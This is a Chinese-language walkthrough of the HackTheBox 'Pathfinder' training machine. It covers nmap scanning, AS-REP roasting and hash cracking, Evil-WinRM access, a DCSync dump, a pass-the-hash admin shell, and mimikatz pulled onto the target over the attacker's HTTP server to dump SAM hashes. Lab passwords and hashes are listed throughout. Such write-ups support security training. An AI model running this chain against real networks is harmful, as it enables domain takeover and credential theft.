# Pathfinder
###### tags: `HTB_Starting Point`

1. 枚舉(Enumeration)

* 老樣子，一開始先用Ping確認VPN可以成功連線到靶機
```
sudo nmap -A -oA /nmap/Pathfind 10.10.10.30
```
![](https://i.imgur.com/b0t8TBu.png)

如上圖Ping的結果，可以發現TTL值為127。由於是走VPN機器和我們之間只有一條路由。因此，肯定它是Windows機器。

* 對所有TCP端口運行Nmap快速掃描，以識別打開的端口。
```
sudo nmap -n -vv --open -T4 -p- -oN Pathfinder.nmap 10.10.10.30
```
-n : Never do DNS resolution
-vv : Extra verbosity
–open : Output only open ports
-p- : Full TCP ports range (65535)
-T4 : Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network
![](https://i.imgur.com/fqXrpDO.png)
* 查看一下Nmap結果，通過檢查開放的Port，例如(LADP、Kerberos-sec、Kpasswd5)，可以猜測它是一台AD主機，這也是為什麼要掃描所有端口的好處!

![](https://i.imgur.com/6V1mP8x.png)

* 接下來，我們對所有開放的端口，運行Nmap引擎腳本

```
sudo nmap -sV -sC -oN DetailPorts.nmap -p 49667,49720,49676,49677,593,139,3269,389,9389,135,3268,49664,464,47001,636,49700,49665,49666,49672,5985,445,53,49683,88 10.10.10.30
```
![](https://i.imgur.com/fLi9aBm.png)

* 從上圖的結果可知，我們所在的Domain：MEGACORP。我們從上一台靶機Shield獲得了一些憑據
sandra:Password1234!
* 首先，我們可以使用[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)工具驗證一下
```
sudo ldapdomaindump -u MEGACORP\\sandra -p Password1234! -o ldapinfo 10.10.10.30 --no-json --no-grep  
```
-u    : DOMAIN\username for authentication, leave empty for anonymous authentication
-p    : Password or LM:NTLM hash, will prompt if not specified
-o    : Directory in which the dump will be saved (default: current)
--no-json    : Disable JSON output
--no-grep    : Disable Greppable output 

![](https://i.imgur.com/fkhn0SO.png)
* 查看一下結果，可以發現有很多.html檔案，可以直接在Webpage上面查看!
```
cd ldapinfo
ls
```
![](https://i.imgur.com/V6uLSd6.png)

* 我們選擇下載htmltext工具來查看文檔
```
sudo apt-get install html2text
```
![](https://i.imgur.com/zO2TKk5.png)

* 先來查看一下Domain裡面有哪些使用者
```
html2text domain_users.html
```
![](https://i.imgur.com/ZBwHDYS.png)
![](https://i.imgur.com/0GmKWWV.png)

可以發現到總共有5個帳戶。Guest、Administrator和krbtgt帳戶是default帳戶。 sandra和svc_bes帳戶是用戶創建的帳戶。而值得注意的是svc_bes帳戶，因為它啟用了DONT_REQ_PREAUTH的Flag。

如果需要了解DONT_REQ_PREAUTH標誌的含義，則必須先了解kerberos身份驗證。
現在簡單說明什麼是kerberos身份驗證：
![](https://i.imgur.com/tF1qEJM.png)

當用戶如果設置了DONT_REQ_PREAUTH標誌，則該過程的第二步和第三步可能會丟失。 這代表著可以直接索取Ticket!

2. Foothold(立足點)
* 由於需要用到impacket，所以這邊簡單帶過安裝步驟
```
sudo -s
cd /opt && git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket
sudo python3 -m pip install .
sudo python3 setup.py install
cd examples/
```
* 現在，我們將使用impacket的GetNPUsers.py腳本來獲取Ticket。
```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass -format john 
```
![](https://i.imgur.com/xkKu8RT.png)

* 用vim儲存Hash值，並用John破密
```
vim hash
john hash --fork=10 --wordlist=/usr/share/wordlists/rockyou.txt
```
![](https://i.imgur.com/lZ0HVco.png)

* svc_bes : Sheffield19

* 現在，有了用帳號和密碼，就可以使用[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)工具了。輸入下列指令快速安裝!
```
gem install evil-winrm
```
![](https://i.imgur.com/z14RV61.png)
* 用svc_bes帳號執行工具
```
evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30
```
![](https://i.imgur.com/APmWv9Q.png)

我們成功獲得一般使用者的Flag

3. Privilege Escalation(提權)


4. 現在，我們將執行[DCSync](https://www.qomplx.com/kerberos_dcsync_attacks_explained/)攻擊，並使用Impacket的[secretsdump.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py)腳本轉存所有 Domain User的NTLM Hash。
```
cd /opt/impacket/examples
python3 secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```
![](https://i.imgur.com/j8W5ESh.png)
* 如上圖所示，我們獲得了Admin的NTLM Hash，接下來使用Pass The Hash attack來提權!
```
python3 psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```
![](https://i.imgur.com/h4iUgul.png)
* Get Flag!
```
type C:\Users\Administrator\Desktop\root.txt
```
![](https://i.imgur.com/PqELMjN.png)
5. Post Exploitation
* 從目前幾台打下來的經驗，這些靶機都環環相扣，因此我們也將獲取Local admin hash。因此，我們上傳[mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)。然後使用python demon Web服務器將其上傳到靶機上。
```
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip && unzip mimikatz_trunk.zip && cd x64 && python3 -m http.server
```
![](https://i.imgur.com/NWCsa8D.png)
![](https://i.imgur.com/PxiC6Hd.png)
```
powershell.exe -c "IWR -useBasicParsing http://10.10.14.15:8000/mimikatz.exe -o mcat.exe"
```
![](https://i.imgur.com/oB9Wu1y.png)

![](https://i.imgur.com/QXBEuCk.png)

* 執行mimikatz
```
./mcat
```
![](https://i.imgur.com/aQQG557.png)

* 獲得Local主機上admin的Hash
```
lsadump::sam
```
Hash：7facdc498ed1680c4fd1448319a8c04f

![](https://i.imgur.com/tkw1rm9.png)

* 最後我們一樣到[crackstation](https://crackstation.net/)網站破密

![](https://i.imgur.com/jl3oW1d.png)

amdin：Password1!

